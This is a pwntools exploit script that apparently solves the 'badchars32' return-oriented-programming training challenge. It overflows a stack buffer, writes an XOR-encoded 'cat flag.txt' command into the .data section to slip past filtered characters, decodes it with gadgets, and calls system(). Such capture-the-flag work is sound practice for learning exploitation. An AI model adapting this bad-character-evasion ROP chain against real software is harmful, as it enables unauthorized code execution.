from pwn import *
import struct


def write_command(input_command, addr, xor_byte):

    # first add null terminating char(s)
    if len(input_command) % 4 == 0:
        input_command += "\x00" * 4  # add 'null terminate' at the end (must be multiplication of 4)
    else:
        input_command += (4 - (len(input_command) % 4)) * "\x00"  # pad the rest with \x00

    # then xor the command
    xor_command = ''
    for i in input_command:
        # tmp = chr(ord(i) ^ xor_byte)
        # tmp_a = chr(ord(tmp) ^ xor_byte)
        xor_command += chr(ord(i) ^ xor_byte)

    command_payload = ""

    # copy the xor_command to the data section
    for i in range(0, len(xor_command), 4):
        command_payload += p32(0x08048899)  # pop esi; pop edi; ret;
        command_payload += xor_command[i:i + 4]
        command_payload += p32(addr+i)
        command_payload += p32(0x08048893)  # ret = 0x08048893: mov dword ptr [edi], esi; ret;
        # edi doesn't change later on, we ce can call system without any special rop

    # perform the xor at .data (decrypt)
    for i in range(0, len(xor_command)):
        # print i
        # print 'enc: {0}, reg: {1}'.format(xor_command[i], chr(ord(xor_command[i]) ^ xor_byte))
        command_payload += p32(0x08048896)  # 0x08048896: pop ebx; pop ecx; ret;
        command_payload += p32(addr+i)
        command_payload += chr(xor_byte) * 4  # ebx
        command_payload += p32(0x08048890)  # ret = 0x08048890: xor byte ptr [ebx], cl; ret;

    return command_payload


# 0x08048890: xor byte ptr [ebx], cl; ret;
# 0x08048893: mov dword ptr [edi], esi; ret;
# 0x08048899: pop esi; pop edi; ret;
# 0x08048896: pop ebx; pop ecx; ret;

e = ELF("/home/osboxes/PycharmProjects/ROP/badchars32/badchars32")

command = 'cat flag.txt'
xor_byte = 127
crap = "A" * 44
system_addr = p32(0x080487b7)  # 0x080487b7 by usefulFunction ; 0x080484e0 by afl
data_section_addr = e.get_section_by_name(".data").header.sh_addr
# command = '/bin/cat flag.txt' + '\x00'
command = 'cat flag.txt'

payload = crap
payload += write_command(command, data_section_addr, xor_byte)  # first add the command to .data in groups of 4

payload += system_addr  # ret = system_addr
# since there is a 'call' to system(), a new frame is opened below data_section_addr which serve as arg1
payload += p32(data_section_addr)

io = e.process()

io.sendline(payload)

io.interactive()
